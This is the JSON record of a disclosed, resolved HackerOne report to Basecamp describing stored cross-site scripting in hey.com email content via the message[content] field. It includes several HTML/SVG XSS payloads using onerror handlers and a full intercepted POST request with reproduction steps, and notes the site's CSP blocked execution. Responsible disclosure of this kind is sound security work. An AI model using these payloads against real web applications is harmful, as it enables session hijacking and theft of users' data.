{
  "id": 988272,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODgyNzI=",
  "url": "https://hackerone.com/reports/988272",
  "title": "stored XSS in hey.com message content",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-09-22T15:31:43.955Z",
  "submitted_at": "2020-09-22T15:31:44.005Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "carbon61",
    "url": "/carbon61",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 67,
    "url": "https://hackerone.com/basecamp",
    "handle": "basecamp",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Basecamp",
      "twitter_handle": "basecamp",
      "website": "https://basecamp.com/about/policies/security/response",
      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-10-31T06:12:21.638Z",
  "bug_reporter_agreed_on_going_public_at": "2020-10-31T06:12:21.572Z",
  "team_member_agreed_on_going_public_at": "2020-10-31T01:27:23.798Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi \nI found a stored xss using ``` message[content] ``` parameter when forwarding an email or saving it as draft ,  and when the victim click on the email to view it, it gets executed .\n\nI used this payload as the message content :\n````\nFrom: \"f\" <[]@hey.com>\nTo: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com\nMessage-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>\nSubject: <img src=wczxzx onerror=alert(1)>\nMime-Version: 1.0\n\n    </style>\n    </div>\n    <svg><![CDATA[><table background=\"]])><img src=xx:x onerror=alert(2)//\"></svg>\n    <li style=onesr: src= cxxc=></li>\n    style>\n</style>\n  </head>\n<style></style>\n  <body>\n\n<svg><![CDATA[><image xlink: src=\"]]><img src=xx:x onerror=alert(2)//\"></svg>\n<li style=onerror:jkj/onerror=alert(1); =''ds></li>\n    </div>\n  </body>\n</html>\n```\n\n#Note:\n i submitted this stored xss without the CSP bypass just to try not to get a duplicate , i will try to bypass the CSP and let you know.\n\n##Steps To Reproduce:\n1- make two accounts and login to the first one \n2- go to any email and forward it to the second email account and intercept the request and change it like this:\n```\nPOST /messages HTTP/1.1\nHost: app.hey.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: text/html; page-update, text/html, application/xhtml+xml\nAccept-Language: ar,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://app.hey.com/entries/[]/forwards/new\nX-CSRF-Token: []\nContent-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600\nOrigin: https://app.hey.com\nContent-Length: 1156\nDNT: 1\nConnection: close\n\n\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"acting_user_id\"\n\n{acting_user_id}\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"entry[addressed][directly][]\"\n\n[second-email]@hey.com\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"message[subject]\"\n\nFwd: csdc\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"message[content]\"\n\nFrom: \"f\" <[]@hey.com>\nTo: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com\nMessage-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>\nSubject: <img src=wczxzx onerror=alert(1)>\nMime-Version: 1.0\n\n    </style>\n    </div>\n    <svg><![CDATA[><table background=\"]])><img src=xx:x onerror=alert(2)//\"></svg>\n    <li style=onesr: src= cxxc=></li>\n    style>\n</style>\n  </head>\n<style></style>\n  <body>\n\n<svg><![CDATA[><image xlink: src=\"]]><img src=xx:x onerror=alert(2)//\"></svg>\n<li style=onerror:jkj/onerror=alert(1); =''ds></li>\n    </div>\n  </body>\n</html>\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"_method\"\n\npost\n-----------------------------392581797716153644644274802600--\n\n```\n\n3- go to the second email ``` Imbox ``` and click on the email to view it \n4- use the right click on email content to get the devtools and if you view the chrome console you can see the \n```\nabout:blank:1 Refused to execute inline event handler\n because it violates the following Content Security Policy\n directive: \"script-src 'self' https://production.haystack-assets.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com\". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.\n```\n\n## Impact\n\nusing this xss + CSP bypass the attacker can steal data and perform unwanted actions on a victim's behalf.",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-11-30T01:27:23.870Z",
  "allow_singular_disclosure_after": -101132891.4069643,
  "singular_disclosure_allowed": true,
  "vote_count": 77,
  "voters": [
    "th3hidd3nmist",
    "carbon61",
    "namle",
    "n0x496n",
    "fqdn",
    "ali",
    "moex",
    "iamrjarpan",
    "nightm4re",
    "akashhamal0x01",
    "and 67 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 53959,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.hey.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
